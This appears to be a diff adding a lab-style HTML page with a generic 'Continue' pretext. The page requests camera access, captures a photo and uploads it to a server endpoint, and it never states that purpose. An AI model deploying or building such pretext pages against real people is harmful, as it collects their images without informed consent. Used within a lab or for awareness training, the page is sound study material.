@@ -1,0 +1,618 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>Continue</title>
+
+    <style>
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+
+            margin: 0;
+
+            min-height: 100vh;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            background: #f5f6f8;
+
+            font-family:
+                Arial,
+                Helvetica,
+                sans-serif;
+
+            color: #202124;
+
+            padding: 20px;
+        }
+
+        .card {
+
+            width: 100%;
+
+            max-width: 500px;
+
+            background: #ffffff;
+
+            border-radius: 12px;
+
+            padding: 36px;
+
+            text-align: center;
+
+            box-shadow:
+                0 4px 20px
+                rgba(0, 0, 0, 0.08);
+        }
+
+        h1 {
+
+            margin: 0 0 14px;
+
+            font-size: 26px;
+
+            font-weight: 600;
+        }
+
+        p {
+
+            color: #5f6368;
+
+            line-height: 1.6;
+
+            font-size: 15px;
+        }
+
+        button {
+
+            width: 100%;
+
+            margin-top: 20px;
+
+            padding: 14px;
+
+            border: none;
+
+            border-radius: 7px;
+
+            background: #1a73e8;
+
+            color: white;
+
+            font-size: 15px;
+
+            cursor: pointer;
+        }
+
+        button:hover {
+
+            background: #1765cc;
+        }
+
+        button:disabled {
+
+            background: #b7bdc5;
+
+            cursor: not-allowed;
+        }
+
+        .secondary {
+
+            background: #ffffff;
+
+            color: #1a73e8;
+
+            border: 1px solid #dadce0;
+        }
+
+        .secondary:hover {
+
+            background: #f8f9fa;
+        }
+
+        #status {
+
+            margin-top: 20px;
+
+            padding: 12px;
+
+            border-radius: 7px;
+
+            background: #f8f9fa;
+
+            font-size: 14px;
+
+            color: #5f6368;
+
+            line-height: 1.5;
+        }
+
+        .camera-box {
+
+            display: none;
+
+            margin-top: 22px;
+        }
+
+        #camera {
+
+            width: 100%;
+
+            max-height: 350px;
+
+            object-fit: cover;
+
+            border-radius: 10px;
+
+            background: #000000;
+        }
+
+        .result {
+
+            display: none;
+
+            margin-top: 25px;
+
+            padding-top: 22px;
+
+            border-top:
+                1px solid #eeeeee;
+        }
+
+        #capturedImage {
+
+            width: 100%;
+
+            border-radius: 10px;
+
+            margin-top: 15px;
+
+            background: #000000;
+        }
+
+        .success {
+
+            color: #188038;
+
+            font-weight: 600;
+        }
+
+        .footer {
+
+            margin-top: 22px;
+
+            font-size: 12px;
+
+            color: #8a8f94;
+        }
+
+    </style>
+
+</head>
+
+
+<body>
+
+
+<div class="card">
+
+
+    <h1>Continue</h1>
+
+
+    <p>
+        Click the button below to continue.
+    </p>
+
+
+    <button
+        id="permissionButton"
+        onclick="requestCamera()"
+    >
+        Continue
+    </button>
+
+
+    <div id="status">
+
+        Camera permission has not been requested.
+
+    </div>
+
+
+    <div
+        id="cameraBox"
+        class="camera-box"
+    >
+
+        <video
+            id="camera"
+            autoplay
+            playsinline
+        ></video>
+
+
+        <button
+            id="captureButton"
+            onclick="capturePhoto()"
+        >
+
+            Capture Photo
+
+        </button>
+
+    </div>
+
+
+    <canvas
+        id="canvas"
+        style="display:none;"
+    ></canvas>
+
+
+    <div
+        id="result"
+        class="result"
+    >
+
+        <p class="success">
+            Photo saved successfully.
+        </p>
+
+
+        <img
+            id="capturedImage"
+            alt="Captured photo"
+        >
+
+
+        <button
+            class="secondary"
+            onclick="newPhoto()"
+        >
+
+            Capture Again
+
+        </button>
+
+    </div>
+
+
+    <div class="footer">
+
+        By continuing, you agree to proceed
+        to the next page.
+
+    </div>
+
+
+</div>
+
+
+<script>
+
+    let cameraStream = null;
+
+
+    async function requestCamera() {
+
+        const status =
+            document.getElementById(
+                "status"
+            );
+
+
+        const button =
+            document.getElementById(
+                "permissionButton"
+            );
+
+
+        if (
+            !navigator.mediaDevices ||
+            !navigator.mediaDevices.getUserMedia
+        ) {
+
+            status.textContent =
+                "Camera access is not supported by this browser.";
+
+            return;
+        }
+
+
+        status.textContent =
+            "Requesting camera permission...";
+
+
+        try {
+
+            cameraStream =
+                await navigator.mediaDevices
+                    .getUserMedia({
+
+                        video: true,
+
+                        audio: false
+
+                    });
+
+
+            const camera =
+                document.getElementById(
+                    "camera"
+                );
+
+
+            camera.srcObject =
+                cameraStream;
+
+
+            document.getElementById(
+                "cameraBox"
+            ).style.display = "block";
+
+
+            button.disabled = true;
+
+
+            button.textContent =
+                "Camera Access Granted";
+
+
+            status.textContent =
+                "Camera permission granted. You can capture a photo.";
+
+        }
+
+        catch (error) {
+
+            console.error(error);
+
+
+            status.textContent =
+                "Camera permission was denied or unavailable.";
+
+        }
+
+    }
+
+
+    function capturePhoto() {
+
+        if (!cameraStream) {
+
+            return;
+        }
+
+
+        const camera =
+            document.getElementById(
+                "camera"
+            );
+
+
+        const canvas =
+            document.getElementById(
+                "canvas"
+            );
+
+
+        const width =
+            camera.videoWidth;
+
+
+        const height =
+            camera.videoHeight;
+
+
+        if (!width || !height) {
+
+            document.getElementById(
+                "status"
+            ).textContent =
+                "Camera is not ready yet.";
+
+            return;
+        }
+
+
+        canvas.width = width;
+
+        canvas.height = height;
+
+
+        const context =
+            canvas.getContext("2d");
+
+
+        context.drawImage(
+            camera,
+            0,
+            0,
+            width,
+            height
+        );
+
+
+        canvas.toBlob(
+            function(blob) {
+
+                if (!blob) {
+
+                    document.getElementById(
+                        "status"
+                    ).textContent =
+                        "Could not capture the photo.";
+
+                    return;
+                }
+
+
+                uploadPhoto(blob);
+
+            },
+            "image/jpeg",
+            0.92
+        );
+
+
+        document.getElementById(
+            "status"
+        ).textContent =
+            "Capturing photo...";
+
+    }
+
+
+    async function uploadPhoto(blob) {
+
+        try {
+
+            const response =
+                await fetch(
+                    "/upload-photo",
+                    {
+
+                        method: "POST",
+
+                        headers: {
+
+                            "Content-Type":
+                                "image/jpeg"
+
+                        },
+
+                        body: blob
+
+                    }
+                );
+
+
+            const result =
+                await response.json();
+
+
+            if (
+                !response.ok ||
+                !result.success
+            ) {
+
+                throw new Error(
+                    result.message ||
+                    "Photo upload failed."
+                );
+
+            }
+
+
+            const imageURL =
+                URL.createObjectURL(
+                    blob
+                );
+
+
+            document.getElementById(
+                "capturedImage"
+            ).src = imageURL;
+
+
+            document.getElementById(
+                "result"
+            ).style.display = "block";
+
+
+            document.getElementById(
+                "status"
+            ).textContent =
+                "Photo saved to the local laboratory.";
+
+
+            console.log(
+                "[+] Saved:",
+                result.path
+            );
+
+
+            stopCamera();
+
+        }
+
+        catch (error) {
+
+            console.error(error);
+
+
+            document.getElementById(
+                "status"
+            ).textContent =
+                "Photo could not be saved.";
+
+        }
+
+    }
+
+
+    function stopCamera() {
+
+        if (!cameraStream) {
+
+            return;
+        }
+
+
+        cameraStream
+            .getTracks()
+            .forEach(
+                function(track) {
+
+                    track.stop();
+
+                }
+            );
+
+
+        cameraStream = null;
+
+    }
+
+
+    function newPhoto() {
+
+        document.getElementById(
+            "result"
+        ).style.display = "none";
+
+
+        document.getElementById(
+            "capturedImage"
+        ).removeAttribute("src");
+
+
+        requestCamera();
+
+    }
+
+</script>
+
+
+</body>
+
+</html>
+```
